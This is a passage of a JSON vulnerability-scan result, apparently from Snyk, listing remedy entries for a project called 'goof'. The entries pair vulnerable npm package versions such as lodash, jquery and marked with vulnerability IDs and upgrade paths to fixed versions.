      "id": "hawk@3.1.3:SNYK-JS-HAWK-6969142",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hawk@3.1.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HAWK-6969142"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hoek@0.9.1:npm:hoek:20180212",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "hoek",
                "version": "0.9.1",
                "new_version": "4.2.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hoek@0.9.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:hoek:20180212"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hoek@2.16.3:npm:hoek:20180212",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "hoek",
                "version": "2.16.3",
                "new_version": "4.2.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hoek@2.16.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:hoek:20180212"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hosted-git-info@2.1.5:SNYK-JS-HOSTEDGITINFO-1088355",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "hosted-git-info",
                "version": "2.1.5",
                "new_version": "2.8.9"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hosted-git-info@2.1.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HOSTEDGITINFO-1088355"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "hosted-git-info@2.8.5:SNYK-JS-HOSTEDGITINFO-1088355",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "hosted-git-info",
                "version": "2.8.5",
                "new_version": "2.8.9"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "hosted-git-info@2.8.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-HOSTEDGITINFO-1088355"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "http-signature@0.10.1:npm:http-signature:20150122",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "http-signature",
                "version": "0.10.1",
                "new_version": "1.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "http-signature@0.10.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:http-signature:20150122"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "inflight@1.0.5:SNYK-JS-INFLIGHT-6095116",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "inflight@1.0.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-INFLIGHT-6095116"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "inflight@1.0.6:SNYK-JS-INFLIGHT-6095116",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "inflight@1.0.6"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-INFLIGHT-6095116"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ini@1.1.0:SNYK-JS-INI-1048974",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ini",
                "version": "1.1.0",
                "new_version": "1.3.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ini@1.1.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-INI-1048974"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ini@1.3.5:SNYK-JS-INI-1048974",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ini",
                "version": "1.3.5",
                "new_version": "1.3.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ini@1.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-INI-1048974"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ip@1.1.5:SNYK-JS-IP-6240864",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "ip",
                "version": "1.1.5",
                "new_version": "1.1.9"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ip@1.1.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-IP-6240864"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "ip@1.1.5:SNYK-JS-IP-7148531",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "ip@1.1.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-IP-7148531"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "is-my-json-valid@2.19.0:SNYK-JS-ISMYJSONVALID-597165",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "is-my-json-valid",
                "version": "2.19.0",
                "new_version": "2.20.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "is-my-json-valid@2.19.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ISMYJSONVALID-597165"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "is-my-json-valid@2.19.0:SNYK-JS-ISMYJSONVALID-597167",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "is-my-json-valid",
                "version": "2.19.0",
                "new_version": "2.20.3"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "is-my-json-valid@2.19.0"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-ISMYJSONVALID-597167"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jquery@2.2.4:SNYK-JS-JQUERY-174006",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jquery",
                "version": "2.2.4",
                "new_version": "3.4.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jquery@2.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JQUERY-174006"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jquery@2.2.4:SNYK-JS-JQUERY-565129",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jquery",
                "version": "2.2.4",
                "new_version": "3.5.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jquery@2.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JQUERY-565129"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jquery@2.2.4:SNYK-JS-JQUERY-567880",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jquery",
                "version": "2.2.4",
                "new_version": "3.5.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jquery@2.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JQUERY-567880"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jquery@2.2.4:npm:jquery:20150627",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jquery",
                "version": "2.2.4",
                "new_version": "3.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jquery@2.2.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:jquery:20150627"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "js-yaml@3.6.1:SNYK-JS-JSYAML-173999",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "js-yaml",
                "version": "3.6.1",
                "new_version": "3.13.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "js-yaml@3.6.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSYAML-173999"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "js-yaml@3.6.1:SNYK-JS-JSYAML-174129",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "js-yaml",
                "version": "3.6.1",
                "new_version": "3.13.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "js-yaml@3.6.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSYAML-174129"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "json-schema@0.2.3:SNYK-JS-JSONSCHEMA-1920922",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "json-schema",
                "version": "0.2.3",
                "new_version": "0.4.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "json-schema@0.2.3"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSONSCHEMA-1920922"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jsonpointer@4.0.1:SNYK-JS-JSONPOINTER-1577288",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jsonpointer",
                "version": "4.0.1",
                "new_version": "5.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jsonpointer@4.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSONPOINTER-1577288"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jsonpointer@4.0.1:SNYK-JS-JSONPOINTER-598804",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jsonpointer",
                "version": "4.0.1",
                "new_version": "4.1.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jsonpointer@4.0.1"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSONPOINTER-598804"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jszip@3.2.2:SNYK-JS-JSZIP-1251497",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jszip",
                "version": "3.2.2",
                "new_version": "3.7.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jszip@3.2.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSZIP-1251497"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "jszip@3.2.2:SNYK-JS-JSZIP-3188562",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "jszip",
                "version": "3.2.2",
                "new_version": "3.8.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "jszip@3.2.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-JSZIP-3188562"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "kerberos@0.0.24:SNYK-JS-KERBEROS-568900",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "kerberos",
                "version": "0.0.24",
                "new_version": "1.0.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "kerberos@0.0.24"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-KERBEROS-568900"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash.set@4.3.2:SNYK-JS-LODASHSET-1320032",
      "attributes": {
        "is_fixable": false,
        "upgrade_paths": []
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash.set@4.3.2"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASHSET-1320032"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.15:SNYK-JS-LODASH-1018905",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.15",
                "new_version": "4.17.21"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.15"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-1018905"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.15:SNYK-JS-LODASH-1040724",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.15",
                "new_version": "4.17.21"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.15"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-1040724"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.15:SNYK-JS-LODASH-567746",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.15",
                "new_version": "4.17.20"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.15"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-567746"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.15:SNYK-JS-LODASH-608086",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.15",
                "new_version": "4.17.17"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.15"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-608086"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.15:SNYK-JS-LODASH-6139239",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.15",
                "new_version": "4.17.17"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.15"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-6139239"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-1018905",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.21"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-1018905"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-1040724",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.21"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-1040724"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-450202",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.12"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-450202"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-567746",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.20"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-567746"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-608086",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.17"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-608086"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-6139239",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.17"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-6139239"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-73638",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.11"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-73638"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:SNYK-JS-LODASH-73639",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.11"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-LODASH-73639"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "lodash@4.17.4:npm:lodash:20180130",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "lodash",
                "version": "4.17.4",
                "new_version": "4.17.5"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "lodash@4.17.4"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:lodash:20180130"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:SNYK-JS-MARKED-174116",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.6.2"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-174116"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:SNYK-JS-MARKED-2342073",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "4.0.10"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-2342073"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:SNYK-JS-MARKED-2342082",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "4.0.10"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-2342082"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:SNYK-JS-MARKED-451540",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.4.0"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-451540"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:SNYK-JS-MARKED-584281",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "1.1.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MARKED-584281"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:npm:marked:20150520",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.3.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:marked:20150520"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:npm:marked:20170112",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.3.7"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:marked:20170112"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:npm:marked:20170815",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.3.9"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:marked:20170815"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:npm:marked:20170815-1",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.3.9"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:marked:20170815-1"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:npm:marked:20170907",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.3.9"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:marked:20170907"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "marked@0.3.5:npm:marked:20180225",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "marked",
                "version": "0.3.5",
                "new_version": "0.3.18"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "marked@0.3.5"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "npm:marked:20180225"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "micromatch@2.3.8:SNYK-JS-MICROMATCH-6838728",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "micromatch",
                "version": "2.3.8",
                "new_version": "4.0.6"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "micromatch@2.3.8"
          }
        },
        "vulnerability": {
          "data": {
            "type": "vulnerabilities",
            "id": "SNYK-JS-MICROMATCH-6838728"
          }
        }
      }
    },
    {
      "type": "remedies",
      "id": "mime@1.2.11:npm:mime:20170907",
      "attributes": {
        "is_fixable": true,
        "upgrade_paths": [
          {
            "path": [
              {
                "name": "goof",
                "version": "1.0.1"
              },
              {
                "name": "mime",
                "version": "1.2.11",
                "new_version": "1.4.1"
              }
            ]
          }
        ]
      },
      "relationships": {
        "affected_package": {
          "data": {
            "type": "packages",
            "id": "mime@1.2.11"
          }
